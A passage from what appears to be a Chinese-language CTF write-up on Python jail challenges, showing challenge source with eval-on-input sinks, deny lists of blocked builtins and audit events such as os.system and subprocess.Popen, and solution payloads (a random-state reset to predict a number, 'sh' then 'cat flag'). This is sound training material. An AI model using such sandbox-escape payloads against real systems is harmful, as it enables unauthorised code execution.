</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;you&#39;re hacker!&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">try</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="n">eval</span><span class="p">(</span><span class="n">code</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">    <span class="n">except</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="k">pass</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">backdoor</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;Please enter the admin key&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">key</span> <span class="o">=</span> <span class="n">input</span><span class="p">(</span><span class="s2">&#34;&gt;&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="n">key</span> <span class="o">==</span> <span class="n">fake_key_var_in_the_local_but_real_in_the_remote</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="n">code</span> <span class="o">=</span> <span class="n">input</span><span class="p">(</span><span class="s2">&#34;&gt;&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">try</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="nb">print</span><span class="p">(</span><span class="n">eval</span><span class="p">(</span><span class="n">code</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">        <span class="n">except</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="k">pass</span>
</span></span><span class="line"><span class="cl">    <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;Nooo!!!!&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">WELCOME</span> <span class="o">=</span> <span class="s1">&#39;&#39;&#39;
</span></span></span><span class="line"><span class="cl"><span class="s1">  _         _          _         _          _         _        
</span></span></span><span class="line"><span class="cl"><span class="s1"> | |  ____ | |        | |  ____ | |        | |  ____ | |       
</span></span></span><span class="line"><span class="cl"><span class="s1"> | | / __ \| | _____  | | / __ \| | _____  | | / __ \| | _____ 
</span></span></span><span class="line"><span class="cl"><span class="s1"> | |/ / _` | |/ / _ \ | |/ / _` | |/ / _ \ | |/ / _` | |/ / _ </span><span class="se">\
</span></span></span><span class="line"><span class="cl"><span class="se"></span><span class="s1"> | | | (_| |   &lt;  __/ | | | (_| |   &lt;  __/ | | | (_| |   &lt;  __/
</span></span></span><span class="line"><span class="cl"><span class="s1"> |_|\ \__,_|_|\_\___| |_|\ \__,_|_|\_\___| |_|\ \__,_|_|\_\___|
</span></span></span><span class="line"><span class="cl"><span class="s1">     \____/               \____/               \____/                                                                                                                                                                                                                                        
</span></span></span><span class="line"><span class="cl"><span class="s1">&#39;&#39;&#39;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">WELCOME</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="s2">&#34;Now the program has two functions&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="s2">&#34;can you use dockerdoor&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="s2">&#34;1.func&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="s2">&#34;2.backdoor&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">input_data</span> <span class="o">=</span> <span class="n">input</span><span class="p">(</span><span class="s2">&#34;&gt; &#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="k">if</span><span class="p">(</span><span class="n">input_data</span> <span class="o">==</span> <span class="s2">&#34;1&#34;</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="k">func</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="k">elif</span><span class="p">(</span><span class="n">input_data</span> <span class="o">==</span> <span class="s2">&#34;2&#34;</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">backdoor</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;not found the choice&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>calc_jail_beginner_level3的方法不能完全生效</p>
<p><figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20241010235141324.png?imageSlim" title="image-20241010235141324" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20241010235141324.png?imageSlim">
        <img
            
            loading="lazy"
            src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20241010235141324.png?imageSlim"
            srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20241010235141324.png?imageSlim, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20241010235141324.png?imageSlim 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20241010235141324.png?imageSlim 2x"
            sizes="auto"
            alt="image-20241010235141324">
    </a></figure></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">help()
</span></span><span class="line"><span class="cl">__main__ //拿到key
</span></span><span class="line"><span class="cl">随后一句话RCE
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="lake-lake-lake-1" class="headerLink">
    <a href="#lake-lake-lake-1" class="header-mark"></a>laKe laKe laKe</h3><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span><span class="lnt">50
</span><span class="lnt">51
</span><span class="lnt">52
</span><span class="lnt">53
</span><span class="lnt">54
</span><span class="lnt">55
</span><span class="lnt">56
</span><span class="lnt">57
</span><span class="lnt">58
</span><span class="lnt">59
</span><span class="lnt">60
</span><span class="lnt">61
</span><span class="lnt">62
</span><span class="lnt">63
</span><span class="lnt">64
</span><span class="lnt">65
</span><span class="lnt">66
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="c1">#You finsih these two challenge of leak</span>
</span></span><span class="line"><span class="cl"><span class="c1">#So cool</span>
</span></span><span class="line"><span class="cl"><span class="c1">#Now it&#39;s time for laKe!!!!</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">random</span>
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">io</span> <span class="kn">import</span> <span class="n">StringIO</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">sys</span>
</span></span><span class="line"><span class="cl"><span class="n">sys</span><span class="o">.</span><span class="n">addaudithook</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">BLACKED_LIST</span> <span class="o">=</span> <span class="p">[</span><span class="s1">&#39;compile&#39;</span><span class="p">,</span> <span class="s1">&#39;eval&#39;</span><span class="p">,</span> <span class="s1">&#39;exec&#39;</span><span class="p">,</span> <span class="s1">&#39;open&#39;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">eval_func</span> <span class="o">=</span> <span class="nb">eval</span>
</span></span><span class="line"><span class="cl"><span class="n">open_func</span> <span class="o">=</span> <span class="nb">open</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">m</span> <span class="ow">in</span> <span class="n">BLACKED_LIST</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="k">del</span> <span class="n">__builtins__</span><span class="o">.</span><span class="vm">__dict__</span><span class="p">[</span><span class="n">m</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">my_audit_hook</span><span class="p">(</span><span class="n">event</span><span class="p">,</span> <span class="n">_</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">BALCKED_EVENTS</span> <span class="o">=</span> <span class="nb">set</span><span class="p">({</span><span class="s1">&#39;pty.spawn&#39;</span><span class="p">,</span> <span class="s1">&#39;os.system&#39;</span><span class="p">,</span> <span class="s1">&#39;os.exec&#39;</span><span class="p">,</span> <span class="s1">&#39;os.posix_spawn&#39;</span><span class="p">,</span><span class="s1">&#39;os.spawn&#39;</span><span class="p">,</span><span class="s1">&#39;subprocess.Popen&#39;</span><span class="p">})</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">event</span> <span class="ow">in</span> <span class="n">BALCKED_EVENTS</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="k">raise</span> <span class="ne">RuntimeError</span><span class="p">(</span><span class="s1">&#39;Operation banned: </span><span class="si">{}</span><span class="s1">&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">event</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">guesser</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">    <span class="n">game_score</span> <span class="o">=</span> <span class="mi">0</span>
</span></span><span class="line"><span class="cl">    <span class="n">sys</span><span class="o">.</span><span class="n">stdout</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="s1">&#39;Can u guess the number? between 1 and 9999999999999 &gt; &#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">sys</span><span class="o">.</span><span class="n">stdout</span><span class="o">.</span><span class="n">flush</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="n">right_guesser_question_answer</span> <span class="o">=</span> <span class="n">random</span><span class="o">.</span><span class="n">randint</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">9999999999999</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">sys</span><span class="o">.</span><span class="n">stdout</span><span class="p">,</span> <span class="n">sys</span><span class="o">.</span><span class="n">stderr</span><span class="p">,</span> <span class="n">challenge_original_stdout</span> <span class="o">=</span> <span class="n">StringIO</span><span class="p">(),</span> <span class="n">StringIO</span><span class="p">(),</span> <span class="n">sys</span><span class="o">.</span><span class="n">stdout</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">try</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">input_data</span> <span class="o">=</span> <span class="n">eval_func</span><span class="p">(</span><span class="nb">input</span><span class="p">(</span><span class="s1">&#39;&#39;</span><span class="p">),{},{})</span>
</span></span><span class="line"><span class="cl">    <span class="k">except</span> <span class="ne">Exception</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">sys</span><span class="o">.</span><span class="n">stdout</span> <span class="o">=</span> <span class="n">challenge_original_stdout</span>
</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;Seems not right! please guess it!&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">game_score</span>
</span></span><span class="line"><span class="cl">    <span class="n">sys</span><span class="o">.</span><span class="n">stdout</span> <span class="o">=</span> <span class="n">challenge_original_stdout</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">input_data</span> <span class="o">==</span> <span class="n">right_guesser_question_answer</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">game_score</span> <span class="o">+=</span> <span class="mi">1</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">game_score</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">WELCOME</span><span class="o">=</span><span class="s1">&#39;&#39;&#39;
</span></span></span><span class="line"><span class="cl"><span class="s1">  _       _  __      _       _  __      _       _  __    
</span></span></span><span class="line"><span class="cl"><span class="s1"> | |     | |/ /     | |     | |/ /     | |     | |/ /    
</span></span></span><span class="line"><span class="cl"><span class="s1"> | | __ _| &#39; / ___  | | __ _| &#39; / ___  | | __ _| &#39; / ___ 
</span></span></span><span class="line"><span class="cl"><span class="s1"> | |/ _` |  &lt; / _ \ | |/ _` |  &lt; / _ \ | |/ _` |  &lt; / _ </span><span class="se">\
</span></span></span><span class="line"><span class="cl"><span class="se"></span><span class="s1"> | | (_| | . \  __/ | | (_| | . \  __/ | | (_| | . \  __/
</span></span></span><span class="line"><span class="cl"><span class="s1"> |_|\__,_|_|\_\___| |_|\__,_|_|\_\___| |_|\__,_|_|\_\___|
</span></span></span><span class="line"><span class="cl"><span class="s1">                                                         
</span></span></span><span class="line"><span class="cl"><span class="s1">&#39;&#39;&#39;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">main</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="n">WELCOME</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s1">&#39;Welcome to my guesser game!&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">game_score</span> <span class="o">=</span> <span class="n">guesser</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">game_score</span> <span class="o">==</span> <span class="mi">1</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="s1">&#39;you are really super guesser!!!!&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="n">open_func</span><span class="p">(</span><span class="s1">&#39;flag&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">())</span>
</span></span><span class="line"><span class="cl">    <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="s1">&#39;Guess game end!!!&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s1">&#39;__main__&#39;</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="n">sys</span><span class="o">.</span><span class="n">addaudithook</span><span class="p">(</span><span class="n">my_audit_hook</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">main</span><span class="p">()</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>这道题涉及到对python random库中函数的分析</p>
<p>分析过程参考</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">https://zhuanlan.zhihu.com/p/579057932
</span></span></code></pre></td></tr></table>
</div>
</div><p>payload</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">[random:=__import__(&#39;random&#39;), state:=random.getstate(), pre_state:=list(state[1])[:624], random.setstate((3,tuple(pre_state+[0]),None)), random.randint(1, 9999999999999)][-1]
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="4-byte-command" class="headerLink">
    <a href="#4-byte-command" class="header-mark"></a>4 byte command</h3><p>题目无附件，有回显</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">  _                _                           _       _ _   _                _ _  _
</span></span><span class="line"><span class="cl"> | |              (_)                         (_)     (_) | | |              | | || |
</span></span><span class="line"><span class="cl"> | |__   ___  __ _ _ _ __  _ __   ___ _ __     _  __ _ _| | | | _____   _____| | || |_
</span></span><span class="line"><span class="cl"> | &#39;_ \ / _ \/ _` | | &#39;_ \| &#39;_ \ / _ \ &#39;__|   | |/ _` | | | | |/ _ \ \ / / _ \ |__   _|
</span></span><span class="line"><span class="cl"> | |_) |  __/ (_| | | | | | | | |  __/ |      | | (_| | | | | |  __/\ V /  __/ |  | |
</span></span><span class="line"><span class="cl"> |_.__/ \___|\__, |_|_| |_|_| |_|\___|_|      | |\__,_|_|_| |_|\___| \_/ \___|_|  |_|
</span></span><span class="line"><span class="cl">              __/ |                          _/ |
</span></span><span class="line"><span class="cl">             |___/                          |__/                                                                        
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Welcome to the python jail
</span></span><span class="line"><span class="cl">Let&#39;s have an beginner jail of calc
</span></span><span class="line"><span class="cl">Enter your expression and I will evaluate it for you.
</span></span><span class="line"><span class="cl">&gt; 
</span></span></code></pre></td></tr></table>
</div>
</div><p>payload</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">sh
</span></span><span class="line"><span class="cl">cat flag
</span></span></code></pre></td></tr></table>
</div>
</div><p>另外，读取server.py发现</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">if len(input_data)&gt;4:
</span></span><span class="line"><span class="cl">    print(&#34;Oh hacker!&#34;)
</span></span><span class="line"><span class="cl">    exit(0)
</span></span><span class="line"><span class="cl">print(&#39;Answer: {}&#39;.format(os.system(input_data)))
</span></span></code></pre></td></tr></table>
</div>
</div><p>直接将输入的内容作为<code>os.system()</code>参数</p>
<p>其他短字符串绕过姿势可以参考</p>
<p><a href="https://xiaolong22333.top/archives/201/" target="_blank" rel="noopener noreferrer">https://xiaolong22333.top/archives/201/</a></p>
<h3 id="lak3-lak3-lak3" class="headerLink">
    <a href="#lak3-lak3-lak3" class="header-mark"></a>lak3 lak3 lak3</h3><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span><span class="lnt">50
</span><span class="lnt">51
</span><span class="lnt">52
</span><span class="lnt">53
</span><span class="lnt">54
</span><span class="lnt">55
</span><span class="lnt">56
</span><span class="lnt">57
</span><span class="lnt">58
</span><span class="lnt">59
</span><span class="lnt">60
</span><span class="lnt">61
</span><span class="lnt">62
</span><span class="lnt">63
</span><span class="lnt">64
</span><span class="lnt">65
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="c1">#Hi hackers,lak3 comes back</span>
</span></span><span class="line"><span class="cl"><span class="c1">#Have a good luck on it! :Wink:</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">import</span> <span class="n">random</span>
</span></span><span class="line"><span class="cl"><span class="n">from</span> <span class="n">io</span> <span class="n">import</span> <span class="n">StringIO</span>
</span></span><span class="line"><span class="cl"><span class="n">import</span> <span class="n">sys</span>
</span></span><span class="line"><span class="cl"><span class="n">sys</span><span class="o">.</span><span class="n">addaudithook</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">BLACKED_LIST</span> <span class="o">=</span> <span class="p">[</span><span class="s1">&#39;compile&#39;</span><span class="p">,</span> <span class="s1">&#39;eval&#39;</span><span class="p">,</span> <span class="s1">&#39;exec&#39;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">eval_func</span> <span class="o">=</span> <span class="n">eval</span>
</span></span><span class="line"><span class="cl"><span class="n">open_func</span> <span class="o">=</span> <span class="n">open</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">m</span> <span class="ow">in</span> <span class="n">BLACKED_LIST</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="n">del</span> <span class="n">__builtins__</span><span class="o">.</span><span class="n">__dict__</span><span class="p">[</span><span class="n">m</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">my_audit_hook</span><span class="p">(</span><span class="n">event</span><span class="p">,</span> <span class="n">_</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">BALCKED_EVENTS</span> <span class="o">=</span> <span class="n">set</span><span class="p">({</span><span class="s1">&#39;pty.spawn&#39;</span><span class="p">,</span> <span class="s1">&#39;os.system&#39;</span><span class="p">,</span> <span class="s1">&#39;os.exec&#39;</span><span class="p">,</span> <span class="s1">&#39;os.posix_spawn&#39;</span><span class="p">,</span><span class="s1">&#39;os.spawn&#39;</span><span class="p">,</span><span class="s1">&#39;subprocess.Popen&#39;</span><span class="p">,</span><span class="s1">&#39;code.__new__&#39;</span><span class="p">,</span><span class="s1">&#39;function.__new__&#39;</span><span class="p">,</span><span class="s1">&#39;cpython._PySys_ClearAuditHooks&#39;</span><span class="p">,</span><span class="s1">&#39;open&#39;</span><span class="p">})</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">event</span> <span class="ow">in</span> <span class="n">BALCKED_EVENTS</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">raise</span> <span class="n">RuntimeError</span><span class="p">(</span><span class="s1">&#39;Operation banned: {}&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">event</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">guesser</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">    <span class="n">game_score</span> <span class="o">=</span> <span class="mi">0</span>
</span></span><span class="line"><span class="cl">    <span class="n">sys</span><span class="o">.</span><span class="n">stdout</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="s1">&#39;Can u guess the number? between 1 and 9999999999999 &gt; &#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">sys</span><span class="o">.</span><span class="n">stdout</span><span class="o">.</span><span class="n">flush</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="n">right_guesser_question_answer</span> <span class="o">=</span> <span class="n">random</span><span class="o">.</span><span class="n">randint</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">9999999999999</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">sys</span><span class="o">.</span><span class="n">stdout</span><span class="p">,</span> <span class="n">sys</span><span class="o">.</span><span class="n">stderr</span><span class="p">,</span> <span class="n">challenge_original_stdout</span> <span class="o">=</span> <span class="n">StringIO</span><span class="p">(),</span> <span class="n">StringIO</span><span class="p">(),</span> <span class="n">sys</span><span class="o">.</span><span class="n">stdout</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">try</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">input_data</span> <span class="o">=</span> <span class="n">eval_func</span><span class="p">(</span><span class="n">input</span><span class="p">(</span><span class="s1">&#39;&#39;</span><span class="p">),{},{})</span>
</span></span><span class="line"><span class="cl">    <span class="n">except</span> <span class="n">Exception</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">sys</span><span class="o">.</span><span class="n">stdout</span> <span class="o">=</span> <span class="n">challenge_original_stdout</span>
</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;Seems not right! please guess it!&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">game_score</span>
</span></span><span class="line"><span class="cl">    <span class="n">sys</span><span class="o">.</span><span class="n">stdout</span> <span class="o">=</span> <span class="n">challenge_original_stdout</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">input_data</span> <span class="o">==</span> <span class="n">right_guesser_question_answer</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">game_score</span> <span class="o">+=</span> <span class="mi">1</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">game_score</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">WELCOME</span><span class="o">=</span><span class="s1">&#39;&#39;&#39;
</span></span></span><span class="line"><span class="cl"><span class="s1">  _       _    ____    _       _    ____    _       _    ____  
</span></span></span><span class="line"><span class="cl"><span class="s1"> | |     | |  |___ \  | |     | |  |___ \  | |     | |  |___ \ 
</span></span></span><span class="line"><span class="cl"><span class="s1"> | | __ _| | __ __) | | | __ _| | __ __) | | | __ _| | __ __) |
</span></span></span><span class="line"><span class="cl"><span class="s1"> | |/ _` | |/ /|__ &lt;  | |/ _` | |/ /|__ &lt;  | |/ _` | |/ /|__ &lt; 
</span></span></span><span class="line"><span class="cl"><span class="s1"> | | (_| |   &lt; ___) | | | (_| |   &lt; ___) | | | (_| |   &lt; ___) |
</span></span></span><span class="line"><span class="cl"><span class="s1"> |_|\__,_|_|\_\____/  |_|\__,_|_|\_\____/  |_|\__,_|_|\_\____/ 
</span></span></span><span class="line"><span class="cl"><span class="s1">                                                                                                                                                                       
</span></span></span><span class="line"><span class="cl"><span class="s1">&#39;&#39;&#39;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">main</span><span class="p">():</span>
